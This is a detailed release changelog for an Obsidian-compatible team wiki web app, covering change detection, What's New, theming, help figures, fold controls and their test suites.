**Every file in the vault was being indexed with no modified date at all.** Both local enumerations pushed `modified: null`; only the dormant SharePoint path ever read a real timestamp, and local mode is what is deployed. So What's New compared every file's empty stamp against every other file's empty stamp, found them equal, and reported nothing. **Three features that shipped in 0.23.0 have never once been able to fire:**

- The **Updated** group could not populate. Every edit made in Obsidian or in the app was invisible.
- The **date-window filter** passed everything, because `Date.parse('')` is `NaN` and `NaN < cutoff` is false.
- **Every page fell into the "Older" group.** `wnGroupOf()` buckets by age into This week / This month / Older, and with no date the age was `NaN`, which fails both tests. The two upper groups have never appeared.

New pages still appeared, because that runs off path presence rather than dates — which is exactly why the feature looked like it worked.

**Change is now decided by a content hash, not by a timestamp.** OneDrive rewrites modified times on files whose content never changed, so a timestamp alone would trade one broken signal for a noisy one. Detection is two-stage and stays cheap: modified time and size come free from enumeration and are compared on every scan; a file is only read and hashed where one of them differs. **A steady-state scan reads no file contents at all.** The index carries `{ m, s, h }` per path, roughly 32KB for 500 notes.

- **SHA-256 via `crypto.subtle`, truncated to 16 hex characters.** One guard, not a second algorithm: without a secure context there is no `crypto.subtle`, so the hash is skipped and the comparison degrades to modified time plus size. Noisier, never broken.
- **Renames and moves now pair on content instead of on the timestamp.** Renaming a file in Obsidian leaves the bytes alone while the move frequently rewrites its modified time, so the old timestamp pairing was unreliable in principle — and in local mode it was pairing every vanished path against every arrived one, because all of them read as the empty string. A moved page no longer resurfaces as New for the whole team.
- **Upgrading re-seeds rather than flooding.** A pre-0.25.0 index is recognised by its shape and treated as a first run. Without that, every note in the vault would gain a real signature on the same scan and arrive as Updated at once.
- **The bulk guard stays, and now guards something real.** It counts hash-confirmed changes, so a sync sweep that only rewrites modified times no longer reaches it. What is left for it to absorb is a genuine bulk edit or a vault reorganisation.
- The timestamp is still read and still used — for sorting, the relative "3 days ago" label and the date-window filter. It just no longer decides what counts as a change.

**Why it went unnoticed for two releases, which is the part worth keeping.** The 88-check What's New suite passed the whole time, because it built its vault entries by hand with timestamps written into the fixture. The bug was in the code meant to supply those timestamps. A suite that never touches the real data source cannot tell you the real data source is empty. The new `change-detection.test.js` drives `localEnumRoot()` and `localEnumFolder()` against faked file handles and asserts what comes out of enumeration, not what was handed to the algorithm. It also counts file reads, so the two-stage laziness is measured rather than assumed.

## 0.24.0 — 2026-08-05

**Changed:** `index.html`, `help.md`, `help-edit.md`
**Added:** `supporting/tests/paragraph-breaks.test.js`
**Fixed:** `supporting/tests/smoke6-reopen.js` — the last file still carrying a dead session mount path

*Line breaks are kept. The inbox strip moves to the bottom.*

**Every line break you type is now kept in rendered prose.** Press Enter once and the next line starts on its own line. Standard Markdown merges consecutive lines into one flowing paragraph, and this app did that until now.

- **The reason is Obsidian's editor, not its reading view.** Pages here are authored in Edit / Live Preview, where a single Enter visibly starts a new line, so that is the shape the author intended. Reading view happens to agree, but it is not the argument. This is the same call made in 0.9i-2 for tab trees, and matching it means the app has one rule to explain instead of two that point in opposite directions.
- **Known cost, accepted rather than worked around.** Text pasted from an email or a PDF arrives wrapped at someone else's column width and will render with those wraps intact. The fix is to join the lines at the source. The alternative — merging everything — loses deliberate breaks in notes, address blocks and contact details, which is the more common case in this vault.
- Blank-line paragraphs, headings, lists, quotes, tables and code are unaffected. Nothing about the block parser changed; only the `para` case of `renderSingleBlock` reads `block.lines` instead of `block.content`.
- **Inline spans that cross a line still work.** The lines are handed to `renderInline` as one newline-separated string and the newlines become `<br>` afterwards, so `**bold that wraps**` keeps its formatting. Rendering line-by-line would have shown the raw asterisks. `renderInline` was already newline-safe by construction: its code-span regex excludes `\n` and `escHtml` leaves newlines alone.
- **Revertible in one line**, marked at the change site. `block.content` is still populated and still read by the `[!copy]` serializer and by search, both of which want one flat string.

**The Comment Inbox / Review Inbox strip now sits at the bottom of the right panel**, between the panes and the version tag, instead of between the tab rail and the panes. Agreed Session 33, built now.

- Each button only shows with its own tab open, so in the old position every relevant tab switch resized the strip and pushed all pane content down by that amount — a jump at the top of a 220px column caused by something appearing at the far end of it. Below the panes it grows against the version footer and nothing above it moves.
- The strip's border moved from its bottom edge to its top edge to match, and the two buttons now stack with a 4px gap. They previously touched, which read as one control with a seam rather than two buttons.
- **Interim, on purpose.** Both inboxes are administrator surfaces and want a fuller rethink once a Roles concept exists. This is the positional half, which depends on nothing and should not have waited for it.
- No behavior change: same buttons, same handlers, same show/hide rule in `updateCommentTabCount()`.

## 0.23.0 — 2026-08-05

**Changed:** `index.html`, `help.md`, `help-edit.md`, all 8 existing files in `help-assets/`
**Added:** `help-assets/fig-09-whats-new.svg`
**Added:** `supporting/tests/whats-new.test.js` (88 checks)
**Fixed:** the four older suites now resolve jsdom and the source path themselves

*A page that tells you what changed since you last looked.*

- **New "What's New" row in the sidebar**, pinned between the toolbar and the tree with a count of what you haven't seen. It sits outside the tree deliberately: inside it, Collapse all would fold it away and it would scroll out of sight, which is the opposite of what a notification row is for. The count is hidden entirely at zero rather than showing a `0`.
- **New and Updated are decided by whether a path was in your last known index, never by the file's created date.** This is the load-bearing decision. New pages are written in Obsidian and get their WikiBase frontmatter injected afterwards, which rewrites the file — so under any timestamp scheme every genuinely-new page would arrive looking like an edit. Path-presence can't be fooled by that. The same index answers renames and deletions for free, which is why one mechanism beat three separate heuristics.
- **Seen is tracked per page, and commits when you leave a page rather than when you open it.** A single "last visited" timestamp, which is what Confluence and Notion use, would clear the whole list the moment you opened it. Per-page also means a re-edited page becomes unseen again. Committing on leave is what makes the highlight visible at all: mark on open and you never see the state you were being shown. A page that fails to load is never counted as read, and closing the tab counts as leaving, so the last page of a session isn't stranded unseen.
- **First run seeds everything as seen** and counts from that moment. Without it a new hire opens the app to "247 unseen", which carries the same information as no badge at all.
- **Renames carry their seen state across**; deletions drop out of every store. A rename is detected as a path that vanished and a path that appeared with the same modified stamp — the only signal available, since neither backend returns a file id.
- **A bulk timestamp rewrite is absorbed rather than listed.** More than 25 updates in one scan means a sync client touched the vault, not that anyone edited it; those changes go into the index and are marked seen, with one line saying so. Without this guard a single OneDrive event would poison the badge permanently with no way back except clearing site data.
- **Unseen rows get an accent dot and full-strength text; seen rows fade back to secondary.** The rejected alternative was an accent-background wash with a left rail, which spends `--accent-bg` on a passive state where it collides with hover and row selection, and floods the pane after a bulk import. **Red is not used anywhere here** — it stays reserved for comments, because a new page is not an alert. New is green, Updated is gray, Must read is orange.
- **One filter axis with four values** (Unseen / New / Updated / All) plus a separate time window (30 / 90 / All). Collapsed from two overlapping axes on purpose; it loses "new and unseen", which nobody on a team of ten is going to ask for. Both persist.
- **Grouped as a digest, not a feed:** Required reading, This week, Earlier this month, Older.
- **Two new frontmatter keys, `must-read` and `onboarding`.** They exist as a pair because one key can't carry both meanings. `must-read` is time-bound and **expires 30 days after the page first surfaced to *that person*, not from the file's modified date** — otherwise someone back from five weeks' leave gets a list that pre-expired without them. On lapse it loses the orange pill and leaves Required reading, but **keeps its unseen dot and stays in the list**; nothing is ever silently marked read. Both the first-surfaced and lapsed dates are recorded for later reporting.
- **Mark all as seen skips must-reads and names what it skipped**, globally and per group. A required page that nobody has read must not be clearable by a bulk action, and the skip has to be visible rather than silent.
- **Nothing is written to the vault.** The index, the seen map and the surfaced/lapsed dates are all per-user in local storage, so this stays compatible with a read-only deployment. The two frontmatter flags are read off the sweep `scanBadges()` already runs for the file audit, so the feature adds no vault reads at all.
- Clicking a row opens through `openFile()`, the same path a sidebar click takes, so history, backlinks, the Outline and the last-note store all behave identically however you got there. Reconnecting to a different vault clears the view but deliberately **not** the stored index — the old vault's paths fall out as deletions on the next scan, which self-heals, where clearing would re-seed and mark a returning vault entirely seen.
- Verified with an 88-check suite covering the index diff in both directions, first-run seeding, commit-on-leave including the failed-load case, deletions, rename pairing and its negative case, the bulk threshold from both sides, all four filters and the window, all four groups, per-person expiry and everything it must preserve, the mark-all skip and its message, the rendered page, the colour rules, and the absence of any vault write.
**Help, same release.** What's New is documented in **Help → Finding things** with a **ninth figure** showing the sidebar row and the page together — the unseen dot, the pills, the filter bar, and callouts for the three things that are not self-evident (the count hides at zero, seen rows fade rather than disappear, and seen commits on leaving). The two frontmatter keys are in **Help — Editing and Markdown → Properties**. The 0.22.0 Reconnect item was also missing from help entirely and is now in both the control table and troubleshooting.

**Every figure was rebuilt for legibility, and three were factually wrong.**

- **All 8 SVG figures had text running into other text or off the canvas.** They are hand-drawn with absolute coordinates and no auto-layout, so a caption that grew by a few words silently landed on its neighbour — invisible in a diff, obvious on screen. 27 measured collisions and clipped labels, in 7 of the 8 files. The commonest cause was a full-width footer line laid across the bottom of a column of captions that had since grown taller than the canvas.
- **The fix is measured, not eyeballed**, and **the measurement is now a test.** `help-split.test.js` computes every label's box, including inherited `<g transform>` offsets, and fails on any overlap or anything escaping the viewBox. Widths are estimated against a deliberately wide font, because these figures ask for `-apple-system`/`Segoe UI` and what a machine actually resolves varies — clean against the widest realistic fallback means clean everywhere.
- **Three figures still drew controls that no longer exist.** `fig-01` and `fig-06` showed the reader's fold pill, deleted in 0.20.0; `fig-01` and `fig-05` showed the sidebar's three fold buttons, collapsed to one in 0.21.0; `fig-06` still explained that clicking a heading is "how Collapse unused knows where you are", and Collapse unused was cut outright. `fig-01` also had a hardcoded "Version 0.18.0". Two further assertions now guard exactly this: no figure may mention Collapse unused, and none may show a version older than 0.20.0.
- `fig-01` and `fig-05` gained the What's New row, so the sidebar in a drawing matches the sidebar on screen.
- **`fig-04` was worse than a layout bug:** its right-hand labels were one row out of step with their own leader lines, so Help's line pointed at the update caption and the badge's line pointed at Help. Every label on that side named the wrong icon.
- Both help pages' "Written for Version" line had drifted five releases behind, to 0.18.0. Corrected, and now **pinned to the app's own version badge by a test** rather than to a literal, so the next release that forgets it fails instead of drifting quietly.
- **Not built, and worth stating:** the byte-delta floor for trivial edits. Neither backend fetches file size today (`$select` asks for `Name`, `ServerRelativeUrl`, `TimeLastModified` only), so implementing it meant changing enumeration in both modes for a second-order noise filter. The bulk-change guard covers the case that actually hurts.

---

## 0.22.1 — 2026-08-05

**Changed:** `index.html`
**Added:** `supporting/tests/props-flyout.test.js` (13 checks)
**Fixed:** `supporting/tests/reconnect-vault.test.js` — self-resolving paths

*One line. The Properties flyout was collapsing to a single row.*

- **`#props-panel` was capped at `max-height: 70%`, and 70% of nothing is nothing.** The flyout lives inside `#reader-corner-align`, which is `position: absolute` with no height set and only absolutely-positioned children, so its content height computes to zero. A percentage max-height resolves against that, which collapsed the panel to one row plus a scrollbar no matter how many properties the file had. Now `min(70vh, 560px)` — the viewport is a real height, and the second term stops the panel running the full length of a tall monitor.
- This worked when it shipped in S13 and broke without anyone touching the rule, because the corner controls were later moved inside the `#reader-corner-align` wrapper (v0.14.1, aligning them to the text margin). Worth remembering as a class of bug rather than an incident: **any percentage height inside that wrapper is dead**, and the wrapper now holds the nav pill, the fold controls, Properties and Edit.

---

## 0.22.0 - 2026-08-05

**Changed:** `index.html`
**Added:** `supporting/tests/reconnect-vault.test.js` (25 checks)

*A way out of picking the wrong folder.*

- **New "Reconnect to vault" item in the user dropdown**, below Switch user. Opens the folder picker and points the app at a different folder. Previously a wrong pick at boot was only escapable by clearing site data, since the chosen folder is remembered in IndexedDB and reused silently on every launch.
- **Local-mode only.** The item is shown or hidden on every dropdown open based on `LOCAL.on`, rather than once at boot, so boot ordering can't leave it in the wrong state. SharePoint mode has no folder to pick. The path comes from `CONFIG`.
- **Cancelling the picker is a clean no-op.** Nothing is reset until a folder is actually chosen, so a misclick costs nothing. An unsaved edit in the current vault still blocks the switch through the existing `guardLeaveEdit()`.
- **New `resetVaultState()` clears everything derived from the previous vault** before boot runs against the new folder: the four per-folder caches, the file index and folder map, the review and comment badge counts, nav history, the search index, and the reader itself. This also closes a latent bug on the pre-existing boot-time "different folder" path. The per-folder caches are keyed by path, and paths repeat across vaults, so a folder named `Policies` in the new vault could have shown the old vault's file list under it.
- The remembered last note is dropped on a deliberate reconnect only. A normal boot still reopens where you left off.

---

## 0.21.0 — 2026-08-05

**Changed:** `index.html`, `help.md`
**Changed:** `supporting/tests/fold-consolidation.test.js` (grown to 156 checks)

*The vault tree joins the fold consolidation, but takes the opposite decision on memory.*

- **The sidebar's three fold buttons become one symbol**, matching the Outline's: Collapse all until every folder is closed, then the same control expands. **Collapse unused is cut here too**, for the same reason it went from the reader and the Outline.
- **Folder open/closed state is remembered again**, per person, across sessions and reloads (`wb_folders`). This restores a store that 0.9a removed and **deliberately takes the opposite decision from heading folds one release earlier.** The distinction is that a folder tree is navigation furniture — you arrange it once and want it to stay arranged — and a closed folder is *visibly* a closed folder. A collapsed heading hid content with nothing on screen to say so, which is what made saving it a problem. Nothing about that reasoning applies to a tree whose closed state you can see.
- **The saved tree and "Open last note" compose instead of competing.** At boot the saved folders are restored first, then the ancestor chain down to the last note is added on top as a union. Previously "Open last note" decided the whole tree fresh every launch. Turn it off and you now get your own tree back rather than everything collapsed.
- Expanding everything runs the folder preload and re-applies, so folders whose children had never been enumerated open properly on the first click rather than needing a second.
- Creating a file or folder inside a folder now persists that folder being open, so it is still open next launch.
- Verified by a new section in the fold suite covering the single control, the removals, storage round-tripping, the empty-state cleanup, both toggle directions, the symbol's label, and the boot union.

---

## 0.20.0 — 2026-08-05

**Changed:** `index.html`
**Added:** `supporting/tests/fold-consolidation.test.js`

*Ten fold controls become four, and files stop opening in a state nobody chose.*

- **Files always open fully expanded.** The per-file heading-fold memory added in 0.9a-2 (`wb_folds:<url>`) is gone, along with the Outline's own equivalent (`wb_outline_folds:<url>`). That store was the reason the reader looked randomly collapsed: it faithfully replayed whatever a bulk Collapse All had left behind, weeks later, with nothing on screen to say anything was hidden. Removing it is what makes "opens expanded" actually true. **List folds are deliberately still remembered** (`wb_li_folds:<url>` is untouched) — see the hidden-count note below for why that asymmetry is safe now when heading memory wasn't.
- **Bulk collapse moved out of the reader and into the Outline, as one symbol instead of three buttons.** `#reader-fold-pill` is deleted; the reader folds one heading at a time through its own chevrons. This matches where Word's Navigation Pane, Obsidian's Outline plugin and VS Code's Outline view all put it — the outline is a view of the document, so folding it is a view operation. With nothing persisted the state is genuinely binary, so one control that reads Collapse all until everything is folded and Expand all after covers both directions.
- **The Outline and the reader no longer share fold state in either direction, and the lock toggle is gone.** This reverses the Session 22 decision that made sharing an option; that call was made before watching people use it, and every reference application keeps the two independent.
- **Collapse unused is cut entirely.** No mainstream editor ships it as visible chrome — VS Code has the equivalent as a keybinding only — and of the three buttons it was the one nobody reached for.
- **Folded rows now say what they're hiding.** A folded heading, list item or list carries a muted "N hidden" badge. Folded state used to hinge on noticing a rotated chevron, which is the single biggest reason a collapsed page read as broken rather than collapsed. This is also what makes keeping list-fold memory defensible: a bullet that reopens reading "12 hidden" is legible in a way a silently closed H2 never was.
- **Alt/Option-click folds a whole subtree, replacing the double-click gesture.** The 220ms click/double-click disambiguation window is deleted with it, so ordinary single clicks fire instantly again instead of paying a delay to protect a gesture staff had never discovered. Alt-click on a disclosure control is the Finder, Explorer and VS Code convention. It works on heading chevrons, list chevrons and Outline chevrons alike.
- **Root lists get a whole-list fold control** on their first row, revealed on hover anywhere in that list. It adds no capability over Alt-clicking the top chevron; it exists so the capability is visible, since a modifier gesture is exactly as undiscoverable as the double-click it replaced. Lists with no nesting get no control, because there's nothing to collapse.
- **Callouts fold, and Obsidian's `-` / `+` suffix is finally parsed.** This fixes a real pre-existing bug: the old pattern swept everything after `[!type]` into the title, so `> [!warning]- Check this` rendered as "- Check this" and a bare `> [!note]-` rendered a callout literally titled `-`. Any collapsed callout authored in Obsidian has been showing a stray dash here. Now `-` opens collapsed, `+` opens expanded, and the title comes out clean. Unlike Obsidian, the absence of a suffix does **not** make a callout unfoldable — every callout with a body gets a chevron, because the existing vault has no suffixes and nobody should have to learn a convention to collapse a long note. Collapsing hides the body only: the label row keeps its full colour, icon and title, so a folded `[!warning]` still reads as a warning. Nothing is stored and nothing is written back to the file.
- The Outline toolbar gains a heading-count badge, reusing the same `.badge` class as the file counts on sidebar folder rows so the two panels read as siblings.
- Verified with a new 128-check suite covering the removals, the outline toolbar, both directions of the non-sync guarantee, alt-click subtrees, hidden counts, list behaviour, all four callout suffix forms, the `[!copy]` button still working alongside the new chevron, and the delegated click wiring. The suite resolves jsdom and the source path itself rather than hardcoding a session mount, which the three older suites still do.

---

## 0.19.2 — 2026-08-03

**Changed:** `index.html`, `help.md`, `help-edit.md`
**Added:** `supporting/tests/copy-callout.test.js`

*One small feature: a callout you can copy out of.*

- **New `[!copy]` callout type** with a **Copy** button in its title row. Written for the case where a note holds text someone is meant to paste elsewhere — a standard reply, an address, a form of words that has to be exact. Deliberately opt-in: no other callout type gets a button, so the affordance appears only where an author asked for it rather than on every Note and Warning in the vault.
- **Obsidian compatibility is the reason it's a callout and not new syntax.** Obsidian doesn't know the type, so it falls back to its default note styling with "Copy" as the title and shows the text normally. The button exists only at render time and nothing is ever written to the file, so a vault using this stays completely readable in Obsidian.
- **What gets copied is what you see, not the source.** Inline markers are stripped by running the text through the real `renderInline` and taking `textContent`, rather than a second set of strip-the-markers regexes that would drift from the renderer the first time either changed. `**Bold**` copies as `Bold`, `[[Note|Alias]]` as `Alias`. List markers are kept (a list should paste as a list), tables come out tab-separated for spreadsheets and mail clients, and fenced code is copied verbatim.
- **The leading `>` is never in the payload,** because it's already gone: the callout branch of `parseBlocks` strips one `>` per line before it builds the body. That's what made this cheap rather than a project — the same job on a heading section would need line-range mapping that nothing in the app does.
- **Hard line breaks survive into the clipboard.** The `para` block now also carries its original `lines` alongside the joined `content` the renderer uses. Rendering still joins consecutive lines into one paragraph, matching Obsidian; only the copy path keeps the author's breaks, because in a block whose whole purpose is verbatim text those breaks are meaningful. A soft wrap is not a line and costs nothing. Caught by the test suite, which had asserted the flattened behavior and was wrong.
- **Payloads live in a module-level `mdCopyBlocks` array keyed by integer index; the button carries only `data-wb-copyblk="<n>"`.** Putting a block of note text into a DOM attribute would be the largest possible version of exactly what the S12-sec hardening pass existed to stop, and it keeps arbitrarily long payloads out of the DOM entirely. Handled by the existing delegated `wbDelegatedClick`, checked first since the button sits inside a callout label inside the reader.
- Clipboard writing factored into a shared `writeClipboard()` with the hidden-textarea fallback for non-secure contexts (`file://`, some embedded WebViews), reused by the existing folder-path copy. Confirmation is on the button itself rather than the floating tip, which would otherwise cover the first line of the text you just copied.
- Verified with a new 57-check suite covering registration, the button appearing on `[!copy]` and on nothing else, twelve payload shapes (bold, italic, code spans, wikilink aliases, links, lists, tasks, tables, fenced code, nesting, escaped pipes, hard breaks), empty bodies, multiple blocks in one file, index/payload alignment, per-render reset, the full click path including the confirm-and-restore cycle, and the security posture. The 0.19.1 (52), theme (136) and help-split (34) suites re-run clean.
- The 0.19.1 suite's exact-version assertion was loosened to a floor. Pinning the current version in every suite means every release breaks every suite for no useful reason; only the current release's own suite pins it.

---

## 0.19.1 — 2026-08-03

**Changed:** `index.html`
**Added:** `supporting/tests/bugfix-0191.test.js`
**Packaging:** first release shipped as `deploy/` instead of a zip.

*Three reported bugs, no new capability.*

- **A pipe inside a table cell no longer breaks the row.** `| [[File Name#Test|Name of Link]] | b | c |` was being split with a bare `row.split('|')`, so the aliased link became two cells and shifted every cell after it one column right. `![[img.png|400]]`, `` `a|b` `` and an escaped `\|` all failed the same way. Splitting is now a small state machine (`tableSplitRaw`) that walks the row tracking `[[ ]]`, backtick spans and `\|`, with three entry points on top of it — `splitTableCells` for cells, `isTableRow` for detection, and `isSeparatorRow` for the dashes row — so the parser and the renderer can't disagree about where a row's columns are.
- **Same fix ends a second, quieter bug:** the table block detector accepted any line that merely `includes('|')`, so a paragraph containing a single `[[a|b]]` sitting under a table got swallowed into it as a row. Detection asks `isTableRow` now. `isTableRow` deliberately tests the *raw* line rather than the trimmed cell count, because `| Only |` trims to one cell and is still a real one-column table.
- **The reader control bar no longer resizes with the content column.** `#reader-corner-align` was capped at `var(--read-width)`, the Theme panel's Narrow/Normal/Wide token, which was correct when it shipped (v0.14.1, keeping the corner buttons on the text margin) but meant the whole header row expanded and contracted every time the reading width changed. It spans the reader panel now; the content column moves under it independently. Every child keeps its 48px inset, which is 24px clear of the 24px handle flare on both sides at any panel width and in either collapsed state. 48px is the floor and the test suite asserts it.
- **The collapse flare stays visible while the pointer is in its own pane.** Before, it only appeared on direct hover of the 4px handle line or permanently once that pane was collapsed, so finding the toggle meant hunting for the line. Left pane hovered keeps the left flare up, right pane hovered keeps the right flare up, the reader keeps neither. Opacity only, on purpose — the tone still comes from `:hover`/`.dragging` on the handle itself, so the S15 decision to stop brightening chrome on panel hover is intact. Two selectors rather than one because DOM order runs sidebar → handle → reader → handle → right panel: the left handle follows its pane and takes a sibling combinator, the right handle precedes its pane and needs `:has()` to look forward.
- Verified with a new 51-check suite covering the splitter against 22 row shapes, rendered column counts, the swallowed-paragraph and one-column regressions, the header rule and every child's flare clearance, and the flare rules including the DOM-order assumption they rest on. The 136-check theme suite and 34-check help-split suite both re-run clean against the modified file.

---

## 0.19.0 — 2026-08-03

**Changed:** `index.html`, `help.md`
**Added:** `help-edit.md`, `help-assets/` (8 SVG figures)

*Help was rewritten and split in two. It had drifted badly — the version on disk was written at 0.12.0 and still described the right panel as four icons with a pinned Comments strip, Settings as a header gear, and Themes as five header-colour palettes. None of that had been true for six versions.*

- **Two help pages, cross-linked.** **Help** covers using the wiki — installing, panels, the sidebar, reading, search, bookmarks, themes, comments, troubleshooting. **Help — Editing and Markdown** covers changing things — enabling editing, creating and moving files, the editor, properties, review, and the full Markdown reference. The **?** button still opens the first one; the two link to each other in the reader.
- **`openHelp()` generalised to `openHelpDoc(file)`**, driven by a new `HELP_DOCS` map that is both the title lookup and the **allowlist**. A link is only pulled into the reader if its href is a literal key in that map — not a pattern match — so a vault note named `help-notes.md`, a `../help.md`, or an external URL ending in `help.md` all fall through to normal link handling. `openHelp()` is kept as a thin wrapper, so every existing call site is untouched.
- **Help links no longer navigate away.** A `[text](help-edit.md)` link used to fall through to the external branch of `renderInline()` and open raw Markdown in a new tab. It now emits `data-wb-helpdoc` and is handled in `wbDelegatedClick` — a `data-wb-*` attribute rather than an inline `onclick`, per the S12 hardening rule.
- **Eight figures**, hand-drawn SVG rather than screenshots: the screen, the header bar, panel edges, the sidebar, the reader's corner controls, right-panel stacking, bookmarking, and the Theme panel. Drawn from `PRESETS.things.dark` and the real icon paths in this file, so they match a default install. About 50 KB for the set, versus roughly 2 MB of PNGs, and they are edited rather than recaptured when the UI moves.
- **Figures live in `help-assets/` beside `index.html`, referenced as `![alt](help-assets/x.svg)`** — deliberately *not* in the vault. Help is fetched with `fetch('./help.md')`, so its relative paths resolve against the app, never the vault; and the `![[x.png]]` form resolves against the *current note's* attachments folder, which does not exist while help is open (`activeUrl` is null). Being app-side also keeps documentation out of everyone's OneDrive and invisible to the nav tree for free.
- Help and its images stay **network-only** — `sw.js` is unchanged, and `isShell()` never matched help. No cache to go stale, no offline help, same as before.
- Corrected three things the old page had simply wrong, beyond staleness: Comments was described as having "This file / Vault" tabs and a **+** button (neither exists — the tab is per-file, the vault-wide view is the separate Comment Inbox); **New (+)** creates at the vault root only, with per-folder creation on the folder row's own hover **+**; and **Reject** in review reverts the file rather than only flagging it.
- Verified with a 34-check jsdom suite (`supporting/tests/help-split.test.js`) covering both docs loading, the cross-link round trip, the allowlist against four near-miss hrefs, all eight figures resolving to files that exist on disk, Outline populating separately for each doc, and the missing-file fallback. The existing 136-check theme suite re-run clean against the modified file.

---

## 0.18.0 — 2026-08-02

**Changed:** `index.html`

*Theme panel, pass 2 of 2. The feature is complete — the three "Soon" rows are real sections now.*

- **Navigation icons.** Icon style: Folder and file (current) / Chevron / Dot / None. Folder colour: Rainbow by position (current) / Accent / Single colour / Muted, with a six-swatch picker when Single is chosen, matched per mode to the palette the rainbow already cycles. New "Colour file icons too" toggle, off by default — file icons stayed muted before and still do unless you ask. The chevron and dot glyphs ride along inside the same icon markup and are swapped by CSS off `body[data-navicons]`, so the string-building sidebar renderer didn't need to branch on a preference. Files get no chevron in Chevron style on purpose: nothing unfolds under a leaf, so the indent and guide line carry it instead.
- **Interface.** Chrome tone: Contrast (current) / Match reader (sidebar and header adopt the reader surface) / Flat (one surface everywhere). Borders: None / Hairline (current) / Strong. Active row indicator: Bar / Tint / Both (current). Density: Compact / Normal / Roomy, driving the nav, root file and Outline row padding from one pair of variables. **Borders → None only clears the decorative `--border`**; `--border-strong` is deliberately kept, because toggle tracks, resize handles and input outlines lean on it and zeroing it makes them vanish rather than look minimal.
- **Share.** Export the theme as a single `WBTHEME1:` string to paste to a teammate, and Apply pasted to take one. **Mode is deliberately not shared** — dark vs light is personal (and can be System), so an export never forces someone else's screen to your preference. Import applies only the keys this build knows about, so a string from a newer version can't inject arbitrary state and one from an older version just leaves newer controls at their defaults; an unknown preset falls back to the default rather than rendering nothing.
- **Set as vault default** writes `zSystem/theme.json`, reusing the existing hidden sidecar convention (same place as the identity records and `.comments.md`/`.changes.md`) rather than inventing a new one. It's read at boot **only on a device that has never had a theme of its own** — no v2 record and nothing from the pre-S32 keys either — so it gives a new person the team's look on first load and never overwrites a choice anyone has already made. A missing or malformed vault theme is swallowed and can't hold up or break boot.
- Copy falls back to selecting the string when `navigator.clipboard` is unavailable (file:// and some embedded WebViews are not secure contexts), rather than leaving a dead button.
- Test suite grown to 136 checks, adding icon modes, chrome tones, border tones, the fresh-device gate, share round-trip, the unknown-key and unknown-preset guards, and the pass-2 reset paths.

---

## 0.17.0 — 2026-08-02

**Changed:** `index.html`

*Theme panel, pass 1 of 2. Pass 2 (navigation icons, interface chrome, theme sharing) is listed in the panel as "Soon" but not built.*

- **New Theme panel**, opened from the user badge dropdown above Settings. Anchored popup rather than a modal, so the reader stays visible and every change shows live behind it. Closes on the X, Esc, or a click outside. No Save button — every control writes to storage the moment it's changed. Reset per section, Reset all in the footer. Sections are an accordion, one open at a time, which is what keeps the panel one screen tall as more sections land.
- **Presets replace the old Header colors × Background color pair of dropdowns.** Those two lists let any palette pair with any background — 64 combinations, most of them mismatched — and left the accent unthemeable. One preset now sets backgrounds, all six heading colours and the accent together, with separate dark and light definitions, and Mode (Dark / Light / **System**, new) is an independent switch. The Theme block is gone from Settings, which keeps Navigation and Advanced.
- **Two presets renamed:** `Dark` → **Default** and `Light` → **Ocean**. The old names collided with the Dark/Light mode names and read as "the light theme", which neither of them ever was.
- **H5 and H6 have real colours in all eight presets.** Seven of the eight previously fell back to secondary grey, which was invisible until the panel showed all six levels side by side.
- **Accent is user-selectable** for the first time: the preset's own accent plus six alternates, tuned separately per mode. Tag chips now follow the accent on purpose (they matched it by coincidence before, both hardcoded to the same blue), so a green accent no longer leaves blue tags behind.
- **Per-level heading colour and underline, H1 through H6.** Underlines were H2-only; each level now draws in its own heading colour. Custom heading colours are stored separately for dark and light, since a colour that reads on near-black often fails on white — editing any colour seeds the full six from the current preset and flips the badge to Custom, with a one-click "Copy these to <other> mode". Picking a named preset again clears the override.
- **New reading controls:** width (Narrow / Normal / Wide), text size, line spacing, body font (system sans / serif / monospace), and a single Heading scale (Compact / Normal / Large) instead of six per-level size fields.
- **Per-level capitals, H1 through H6**, as a smaller secondary toggle to the left of each underline switch. H5 was hardcoded to uppercase with no way to turn it off; it's a per-level opt-in now, shipping on for H5 and off everywhere else so an untouched install is unchanged. Letter-spacing rides along with the transform — tracked-out capitals are the point, plain uppercase at normal spacing reads cramped.
- **Inline title** (off by default): the note's own name rendered as a large heading at the top of the document, Obsidian-style. The reader header bar keeps showing the filename either way.
- **Under the hood:** the 32 hand-written `body[data-theme][data-headers]` / `[data-bg]` CSS rules are replaced by one `PRESETS` table in JS; `applyThemePrefs()` writes the resolved values as inline custom properties on `<body>`, so every existing `var(--heading-1)` / `var(--accent)` / `var(--bg-sidebar)` in the file keeps working with no CSS rewrite. No `color-mix()` or other newer colour function anywhere — the v0.14.4 lesson holds; the accent tint is computed hex→rgba in JS.
- **Storage:** one new `wb_theme_v2` record, migrated once from `wb_theme` / `wb_headers` / `wb_bgcolor` / `wb_h2underline`. The old keys are deliberately left in place, so reverting this file restores the previous look with no data loss.
- **Known behaviour change:** if you had a header palette and a background from two different identities, the background now follows the palette. Removing that mismatch is the point of the pass.
- Verified with an 81-check jsdom suite (`supporting/tests/theme.test.js`) covering preset completeness, migration, panel render, write-through, per-mode custom isolation, per-level caps and underlines, reset paths and the banned-colour-function rule.

---

## 0.16.0 — 2026-07-30

**Changed:** `index.html`

- Clicking a heading's own text in the reader (not its fold chevron) now selects it: mirrors it as the Outline's active item and highlights the row, reusing the exact pin already used for an Outline-click jump (`pinJumpHighlight`/`clearJumpHighlight`) — holds until you scroll away, same as before. Clicking the chevron still only folds/unfolds, unaffected — the two are now separate click targets, the same split the Outline panel already uses between its own fold-chevron and jump buttons.
- Gives Collapse Unused a reliable "current heading" from an explicit click, instead of only whatever the scroll-spy last happened to land on — no changes needed to Collapse Unused itself, it already reads the Outline's active item.

---

## 0.15.0 — 2026-07-24

**Changed:** `index.html`

- New Bookmarks tab in the right panel, between Outline and Comments. Bookmark ribbon icon added to every heading row in the Outline (always visible, not hover-gated) — click toggles a bookmark on that file+heading pair (no content stored), with a brief confirmation tip (reusing the existing folder-link-copy tip style) when one's added or removed.
- Bookmarks tab has two sections: Favorites (flat, user-ordered, empty by default) and Bookmarks (grouped by file, heading order fixed to document order — only the file itself can be reordered or filed into a group). Hovering a bookmark row reveals a star to promote it into Favorites (stays in both places); hovering a Favorites row reveals a pencil to rename it — the only place a favorite can be renamed.
- Organize mode: a sliders toggle in each section header (off by default) gates drag-and-drop reordering, grip handles, and a drop zone to pull an item out of a group. A folder-plus icon in each header creates a single-level named group (no nesting) — available regardless of organize mode, since creating an empty group can't cause an accidental reorder.
